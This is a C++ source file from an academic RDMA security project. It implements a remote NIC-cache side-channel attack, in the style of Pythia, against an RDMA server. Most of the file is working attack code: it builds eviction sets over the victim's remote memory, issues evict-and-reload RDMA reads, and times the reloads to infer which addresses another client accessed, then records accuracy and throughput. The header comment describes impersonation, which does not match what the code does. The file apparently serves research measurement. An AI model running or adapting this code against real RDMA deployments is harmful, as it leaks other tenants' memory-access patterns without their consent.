/**                                                                                                      
 * ReDMArk: Bypassing RDMA Security Mechanisms
 * 
 * Launch a client that will be impersonated.
 *
 * Copyright (c) 2020-2021 ETH-Zurich. All rights reserved.
 * 
 * Author(s): Konstantin Taranov <konstantin.taranov@inf.ethz.ch>
 * 
 */

#include "verbsEP.hpp"
#include "connectRDMA.hpp"
#include <chrono>
#include "cxxopts.hpp"
#include <thread> 
#include <atomic>
//#include <rdma/ib_verbs.h>

#define MEM_POOL_SIZE (1ULL << 33)
#define PYTHIA_THRESHOLD 4000
//#define PYTHIA_THRESHOLD 25000
#define ELAPSE_THRESHOLD 40000
#define RECORD_INTERVAL 1000000000LL
cxxopts::ParseResult
parse(int argc, char* argv[])
{
    cxxopts::Options options(argv[0], "A victim client. It will be impersonated.");
    options
      .positional_help("[optional args]")
      .show_positional_help();
 
  try
  {
 
    options.add_options()
      ("a,address", "IP address of the victim", cxxopts::value<std::string>(), "IP")
      ("o,other_ip", "IP address of the client", cxxopts::value<std::string>(), "other_ip")
      ("t,is_attacker", "Is attacker or not", cxxopts::value<int>(), "is_attacker")
      ("help", "Print help")
     ;
 
    auto result = options.parse(argc, argv);

    if (result.count("help"))
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    if (result.count("address") == 0 || result.count("other_ip") == 0 || result.count("is_attacker") == 0)
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    return result;

  } catch (const cxxopts::OptionException& e)
  {
    std::cout << "error parsing options: " << e.what() << std::endl;
    std::cout << options.help({""}) << std::endl;
    exit(1);
  }
}

 
void printQP(struct ibv_qp *qp) {
	uint32_t *raw = (uint32_t*)qp;
	printf("ibv_qp content:\n");
	for (uint32_t i = 0; i < sizeof(struct ibv_qp)/4; i++) {
		printf("%08x ", raw[i]);
	}
	printf("\nibv_context content:\n");
	raw = (uint32_t*)(qp->context);
	for (uint32_t i = 0; i < sizeof(struct ibv_context)/4; i++) {
		printf("%08x ", raw[i]);
	}
	printf("\n");
	printf("qp->context->cmd_fd,async_fd,num_comp_vectors: %d, %d, %d\n",
			qp->context->cmd_fd,
			qp->context->async_fd,
			qp->context->num_comp_vectors);
}
  
void print_data(VerbsEP *ep){

  struct ibv_qp_attr attr;
  struct ibv_qp_init_attr init_attr;
  int ret = ibv_query_qp(ep->qp, &attr, IBV_QP_RQ_PSN | IBV_QP_SQ_PSN | IBV_QP_AV, &init_attr );
  assert(ret==0 && "ibv_query_qp failed");
  printf("PSNs. receive-PSN: %u send-PSN %u \n", attr.rq_psn, attr.sq_psn);
  printf("interface_id, subnet_prefix: %lu, %lu\n", attr.ah_attr.grh.dgid.global.interface_id, attr.ah_attr.grh.dgid.global.subnet_prefix);
  printf("QPN %u \n",ep->qp->qp_num);
  printQP(ep->qp);
}

#define LINE_BITS 15
#define SET_BITS 10
#define SET_MASK ((1 << SET_BITS) - 1)

uint32_t va2setId(uint64_t virtAddr) {
	return (virtAddr >> LINE_BITS) & SET_MASK;
}

uint32_t va2tagId(uint64_t virtAddr) {
	return virtAddr >> (SET_BITS + LINE_BITS);
}

uint32_t va2secSetId(uint64_t virtAddr) {
	return (virtAddr >> (LINE_BITS + 9)) & SET_MASK;
}

std::vector<VerbsEP *> connections;

// for attacker only
FILE *fp;
std::atomic<uint64_t> total(0), correct(0), hitTotalLat(0), missTotalLat(0), hitCount(0), missCount(0), reqCount(0);
std::chrono::steady_clock::time_point veryBegin;
void recording() {
  std::chrono::steady_clock::time_point cur;
  while (true) {
    usleep(RECORD_INTERVAL/1000);
    cur = std::chrono::steady_clock::now();
    int64_t t = std::chrono::duration_cast<std::chrono::nanoseconds>(cur - veryBegin).count();
    uint64_t c = correct, tot = total;
    if (tot == 0 || reqCount == 0)
      fprintf(fp, "%0.2lf\t%0.1lf\t%lf\t%lu/%lu\n", (double)t/1000000000, 0., 0., 0UL, 0UL);
    else
      fprintf(fp, "%0.2lf\t%0.1lf\t%lf\t%lu/%lu\n", (double)t/1000000000, (double)correct/total*100, (double)reqCount/RECORD_INTERVAL*1000000000, c, tot);
    fflush(fp);
    reqCount = 0;
    correct = 0;
    total = 0;
    hitTotalLat = 0;
    missTotalLat = 0;
    hitCount = 0;
    missCount = 0;
  }
}

int main(int argc, char* argv[]){

  // struct ib_qp ibqp;
  // printf("ib_qp address: %08x, %08x\n", &ibqp, &(ibqp.qp_num));

  auto allparams = parse(argc,argv);

  std::string ip = allparams["address"].as<std::string>();
  std::string otherIp = allparams["other_ip"].as<std::string>();
  int isAttacker = allparams["is_attacker"].as<int>();

  int port = 9999;
  ClientRDMA * client = new ClientRDMA(const_cast<char*>(ip.c_str()),port);
  struct ibv_qp_init_attr attr;
  struct rdma_conn_param conn_param;
 
  memset(&attr, 0, sizeof(attr));
  attr.cap.max_send_wr = 1;
  attr.cap.max_recv_wr = 1;
  attr.cap.max_send_sge = 1;
  attr.cap.max_recv_sge = 1;
  attr.cap.max_inline_data = 0;
  attr.qp_type = IBV_QPT_RC;

  memset(&conn_param, 0 , sizeof(conn_param));
  conn_param.responder_resources = 0;
  conn_param.initiator_depth =  0;
  conn_param.retry_count = 3;  
  conn_param.rnr_retry_count = 3;  
  
  struct ibv_pd* pd = NULL;
  struct ibv_qp_attr mod_attr;
  memset(&mod_attr, 0, sizeof(mod_attr));
  mod_attr.qp_access_flags = IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_READ | IBV_ACCESS_REMOTE_WRITE;
  int ret;
  connections.push_back(client->connectEP(&attr,&conn_param,pd));
  if ((ret = ibv_modify_qp(connections[0]->qp, &mod_attr, IBV_QP_ACCESS_FLAGS))) {
    printf("Failed to change access flags, error_msg: %s\n", strerror(ret));
  }

  VerbsEP* ep = connections[0]; 
  pd = ep->pd;
  
  char* ptr = (char*)malloc(4096);
  strcpy(ptr, "1234");
  struct ibv_mr * mr = ep->reg_mem(ptr,4096);
  
  // int tmp = 0;
  // printf("Enter 1 to continue AFTER server is ready\n");
  // do {
  //   scanf("%d", &tmp);
  // } while (tmp != 1);

  struct ibv_wc wc;
  ep->post_recv(1,  mr);
  printf("Waiting server sending mr info\n");
  while( ep->poll_recv_completion(&wc) == 0) {}
  printf("mr info is recv. Completion status is %d\n",wc.status);
  uint64_t remote_addr = *(uint64_t*)ptr;
  uint32_t rkey = *(uint32_t*) (ptr+8);
  printf("remote_addr: %lu, rkey: %u\n", remote_addr, rkey);

  printf("Signal server we are ready\n");
  ep->send_signaled(1, (uint64_t)mr->addr, mr->lkey, 16);

  while( ep->poll_send_completion(&wc) == 0){

  }
  printf("A message is sent. Completion status is %d\n",wc.status);
  printf("Server is ready if completion status is good\n");

  uint64_t cur = remote_addr + MEM_POOL_SIZE/2;
  uint64_t evict_set_addr[1024][128];
  uint32_t count_tag[1024];
  memset(count_tag, 0, sizeof(uint32_t)*1024);
  for (int i = 0; i < 1024; i++) {
    for (int j = 0; j < 128; j++) {
      uint64_t addr = cur;
      uint32_t setId = va2setId(addr);
      // uint32_t tagId = va2tagId(addr);
      evict_set_addr[setId][count_tag[setId]] = addr;
      count_tag[setId]++;
      cur += (1 << LINE_BITS);
    }
  }

  // for (int i = 0; i < 1024; i++) {
  //   for (int j = 0; j < 128; j++) {
  //     printf("evict_set_addr: %08x %3d %012lx\n", i << 3, j, evict_set_addr[i][j]);
  //     memcpy(ptr, &i, sizeof(int));
  //     connections[0]->write_signaled(1, (uint64_t)mr->addr, mr->lkey, evict_set_addr[i][j], rkey, 4);
  //     struct ibv_wc wc;
  //     while( connections[0]->poll_send_completion(&wc) == 0){
  //   
  //     }
  //     printf("A message is written. Completion status is %d\n",wc.status);

  //   }
  // }
  VerbsEP* otherConnection;
  int otherPort = 9998;
  if (isAttacker == 1) {
    printf("Attacker connect to client to sync (for accuracy measurement)\n");
    ClientRDMA *otherClient = new ClientRDMA(const_cast<char*>(otherIp.c_str()),otherPort);
    struct ibv_qp_init_attr attr;
    struct rdma_conn_param conn_param;
   
    memset(&attr, 0, sizeof(attr));
    attr.cap.max_send_wr = 1;
    attr.cap.max_recv_wr = 1;
    attr.cap.max_send_sge = 1;
    attr.cap.max_recv_sge = 1;
    attr.cap.max_inline_data = 0;
    attr.qp_type = IBV_QPT_RC;
  
    memset(&conn_param, 0 , sizeof(conn_param));
    conn_param.responder_resources = 0;
    conn_param.initiator_depth =  0;
    conn_param.retry_count = 3;  
    conn_param.rnr_retry_count = 3;  
    
    struct ibv_qp_attr mod_attr;
    memset(&mod_attr, 0, sizeof(mod_attr));
    mod_attr.qp_access_flags = IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_READ | IBV_ACCESS_REMOTE_WRITE;
    int ret;
    otherConnection = otherClient->connectEP(&attr,&conn_param,pd);
    if ((ret = ibv_modify_qp(otherConnection->qp, &mod_attr, IBV_QP_ACCESS_FLAGS))) {
      printf("Failed to change access flags, error_msg: %s\n", strerror(ret));
    }
  } else {
    printf("Client wait attacker to sync (for accuracy measurement)\n");
    ServerRDMA * otherServer = new ServerRDMA(const_cast<char*>(otherIp.c_str()),otherPort);
    struct ibv_qp_init_attr attr;
    struct rdma_conn_param conn_param;
   
    memset(&attr, 0, sizeof(attr));
    attr.cap.max_send_wr = 1;
    attr.cap.max_recv_wr = 16;
    attr.cap.max_send_sge = 1;
    attr.cap.max_recv_sge = 1;
    attr.cap.max_inline_data = 0;
    attr.qp_type = IBV_QPT_RC;
  
    memset(&conn_param, 0 , sizeof(conn_param));
    conn_param.responder_resources = 0;
    conn_param.initiator_depth = 0;
    conn_param.retry_count = 3; // TODO
    conn_param.rnr_retry_count = 3; // TODO 
   
    VerbsEP *ep = otherServer->acceptEP(&attr,&conn_param,pd);
    otherConnection = ep;
    printf("Before access flag setup\n");
  
    struct ibv_qp_attr init_attr, rtr_attr, rts_attr;
    struct ibv_qp_init_attr dummy_init_attr;
    int ret;
    memset(&init_attr, 0, sizeof(init_attr));
    memset(&rtr_attr, 0, sizeof(rtr_attr));
    memset(&rts_attr, 0, sizeof(rts_attr));
    if ((ret = ibv_query_qp(ep->qp, &init_attr, IBV_QP_STATE | IBV_QP_PKEY_INDEX | IBV_QP_PORT | IBV_QP_ACCESS_FLAGS, &dummy_init_attr ))) {
            printf("Failed to query init_attr, error_msg: %s\n", strerror(ret));
    } else {
            init_attr.qp_state = IBV_QPS_INIT;
            init_attr.qp_access_flags = IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_READ | IBV_ACCESS_REMOTE_WRITE;
            // printf("init_attr: %d, %hu, %u, %08x\n", init_attr.qp_state, init_attr.pkey_index, (uint32_t)init_attr.port_num, init_attr.qp_access_flags);
    }
    if ((ret = ibv_query_qp(ep->qp, &rtr_attr, IBV_QP_STATE | IBV_QP_AV | IBV_QP_PATH_MTU | IBV_QP_DEST_QPN | IBV_QP_RQ_PSN | IBV_QP_MAX_DEST_RD_ATOMIC | IBV_QP_MIN_RNR_TIMER, &dummy_init_attr))) {
            printf("Failed to query rtr_attr, error_msg: %s\n", strerror(ret));
    } else {
            rtr_attr.qp_state = IBV_QPS_RTR;
    }
    if ((ret = ibv_query_qp(ep->qp, &rts_attr, IBV_QP_STATE | IBV_QP_SQ_PSN | IBV_QP_TIMEOUT | IBV_QP_RETRY_CNT | IBV_QP_RNR_RETRY | IBV_QP_MAX_QP_RD_ATOMIC, &dummy_init_attr))) {
            printf("Failed to query rts_attr, error_msg: %s\n", strerror(ret));
    } else {
            rts_attr.qp_state = IBV_QPS_RTS;
    }
  
    struct ibv_qp_attr qp_attr;
    memset(&qp_attr, 0, sizeof(qp_attr));
    qp_attr.qp_state = IBV_QPS_RESET;
  
    if ((ret = ibv_modify_qp(ep->qp, &qp_attr, IBV_QP_STATE))) {
            printf("Failed to reset state, ret: %d\n", ret);
    }
  
    if ((ret = ibv_modify_qp(ep->qp, &init_attr, IBV_QP_STATE | IBV_QP_PKEY_INDEX | IBV_QP_PORT | IBV_QP_ACCESS_FLAGS))) {
            printf("Failed to init state, error_msg: %s\n", strerror(ret));
    }
  
    if ((ret = ibv_modify_qp(ep->qp, &rtr_attr, IBV_QP_STATE | IBV_QP_AV | IBV_QP_PATH_MTU | IBV_QP_DEST_QPN | IBV_QP_RQ_PSN | IBV_QP_MAX_DEST_RD_ATOMIC | IBV_QP_MIN_RNR_TIMER))) {
            printf("Failed to change to RTR, error_msg: %s\n", strerror(ret));
    }
  
    if ((ret = ibv_modify_qp(ep->qp, &rts_attr, IBV_QP_STATE | IBV_QP_SQ_PSN | IBV_QP_TIMEOUT | IBV_QP_RETRY_CNT | IBV_QP_RNR_RETRY | IBV_QP_MAX_QP_RD_ATOMIC))) {
            printf("Failed to change to RTS, error_msg: %s\n", strerror(ret));
    }
  }
  printf("Client-Attacker connection established\n");

  srand(0);
  std::thread *recordingThread;
  if (isAttacker == 1) {
    fp = fopen("output/pythia-scadet-time-accu-thr.data", "w");
    if (fp == NULL) {
      printf("Open recording file failed\n");
      exit(-1);
    }
    fprintf(fp, "#Time(sec)\tAccuracy(%%)\tThroughput(req/sec)\tCorrect/Total\n");

    veryBegin = std::chrono::steady_clock::now();
    recordingThread = new std::thread(recording);
  }
  while(true){
    if (isAttacker == 1) {
      uint64_t victimAddr = remote_addr + (rand() % (MEM_POOL_SIZE/2));
      uint32_t setId = va2setId(victimAddr);
      uint32_t secSetId = va2secSetId(victimAddr);
      struct ibv_wc wc;
      // evict
      // printf("Evict\n");
      for (int i = 0; i < 128; i++) {
        connections[0]->read_signaled(1, (uint64_t)mr->addr, mr->lkey, evict_set_addr[secSetId][i], rkey, 4);
        while( connections[0]->poll_send_completion(&wc) == 0){ }
	if (wc.status != 0) {
          // printf("Secondary evict req fail, status: %d\n", wc.status);
	} else reqCount++;
        connections[0]->read_signaled(1, (uint64_t)mr->addr, mr->lkey, evict_set_addr[setId][i], rkey, 4);
        while( connections[0]->poll_send_completion(&wc) == 0){ }
	if (wc.status != 0) {
          // printf("Primary evict req fail, status: %d\n", wc.status);
	} else reqCount++;
      }
      int answer = rand() % 2;
      *(uint64_t*) ptr = victimAddr;
      *(int*) (ptr+8) = answer;
      // printf("VictimAddr: %012lx, answer: %d, ", victimAddr, answer);
      // printf("Tell client the target\n");
      otherConnection->send_signaled(1, (uint64_t)mr->addr, mr->lkey, 12);
      while( otherConnection->poll_send_completion(&wc) == 0){ }
      if (wc.status != 0) {
        printf("Control communication to victim fail, status: %d\n", wc.status);
      }
      // printf("Target is sent. Completion status is %d\n",wc.status);

      otherConnection->post_recv(1,  mr);
      // printf("Waiting client to finish accessing target\n");
      while( otherConnection->poll_recv_completion(&wc) == 0) {}
      if (wc.status != 0) {
        printf("Control communication from victim fail, status: %d\n", wc.status);
      }
      // printf("target access is finished. Completion status is %d\n",wc.status);

      // usleep(100);
      // reload
      // printf("Reload\n");
      std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now();
      connections[0]->read_signaled(1, (uint64_t)mr->addr, mr->lkey, victimAddr, rkey, 4);
      while( connections[0]->poll_send_completion(&wc) == 0){ }
      if (wc.status != 0) {
        // printf("Reload req fail, status: %d\n", wc.status);
      } else reqCount++;
      std::chrono::steady_clock::time_point end = std::chrono::steady_clock::now();
      int64_t elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>(end - begin).count();
      if ((elapsed < PYTHIA_THRESHOLD && answer == 1) || (elapsed >= PYTHIA_THRESHOLD && answer == 0))
        correct++;
      if (elapsed < ELAPSE_THRESHOLD) {
        if (answer == 1){
          hitTotalLat += elapsed;
          hitCount++;
        } else {
          missTotalLat += elapsed;
          missCount++;
        }
      }
      total++;
      uint64_t correctI = correct;
      uint64_t totalI = total;
      uint64_t hitTotalLatI = hitTotalLat;
      uint64_t hitCountI = hitCount;
      uint64_t missTotalLatI = missTotalLat;
      uint64_t missCountI = missCount;
      printf("elapsed time: %ld ns, accumulated accuracy: %0.1lf%% (%lu/%lu), avg hit latency: %.0lf, avg miss latency: %.0lf\n", 
        elapsed, (double)correctI/totalI*100, correctI, totalI, 
        (double)hitTotalLatI/hitCountI, (double)missTotalLatI / (double)missCountI);
    } else {
      otherConnection->post_recv(1,  mr);
      // printf("Waiting attacker to give access target\n");
      while( otherConnection->poll_recv_completion(&wc) == 0) {}
      if (wc.status != 0) {
        printf("Control communication from attacker fail, status: %d\n", wc.status);
      }
      // printf("Access target is recv. Completion status is %d\n",wc.status);

      uint64_t victimAddr = *(uint64_t*) ptr;
      int answer = *(int*) (ptr+8);
      // printf("VictimAddr: %012lx, answer: %d\n", victimAddr, answer);
      while (answer == 0 && victimAddr == *(uint64_t*)ptr) {
        victimAddr = remote_addr + (rand() % (MEM_POOL_SIZE/2)); // access another
      }
      connections[0]->read_signaled(1, (uint64_t)mr->addr, mr->lkey, victimAddr, rkey, 4);
      while( connections[0]->poll_send_completion(&wc) == 0){ }
      if (wc.status != 0) {
        printf("Victim access target fail, status: %d\n", wc.status);
      }

      // printf("Tell attacker the target has been accessed\n");
      otherConnection->send_signaled(1, (uint64_t)mr->addr, mr->lkey, 16);
      while( otherConnection->poll_send_completion(&wc) == 0){ }
      if (wc.status != 0) {
        printf("Control communication to attacker fail, status: %d\n", wc.status);
      }
      // printf("Client side finished. Completion status is %d\n",wc.status);
    }

    // int qp_id, len;
    // uint64_t addr;
    // uint32_t rkey;
    // char rw;
    // printf("Input <QP_id> <mem addr> <rkey> <len> <r/w>\n");
    // scanf("%d %lu %u %d %c", &qp_id, &addr, &rkey, &len, &rw);
    // if (rw == 'w') {
    //   printf("Input content to write: ");
    //   scanf("%s", ptr);
    //   connections[qp_id]->write_signaled(1, (uint64_t)mr->addr, mr->lkey, addr, rkey, len);
    //   struct ibv_wc wc;
    //   while( connections[qp_id]->poll_send_completion(&wc) == 0){
    // 
    //   }
    //   printf("A message is written. Completion status is %d\n",wc.status);
    // } else if (rw == 'r') {
    //   connections[qp_id]->read_signaled(1, (uint64_t)mr->addr, mr->lkey, addr, rkey, len);
    //   struct ibv_wc wc;
    //   while( connections[qp_id]->poll_send_completion(&wc) == 0){
    // 
    //   }
    //   printf("A message is read. Completion status is %d\n",wc.status);
    //   printf("Content: ");
    //   for (int i = 0; i < len; i++) {
    //     printf("%c", ptr[i]);
    //   }
    //   printf("set_index: %08x\n", (*(uint32_t*)ptr) << 3);
    //   printf("\n");
    // }
  }
 
  recordingThread->join();

  return 0; 
}

 
 
 
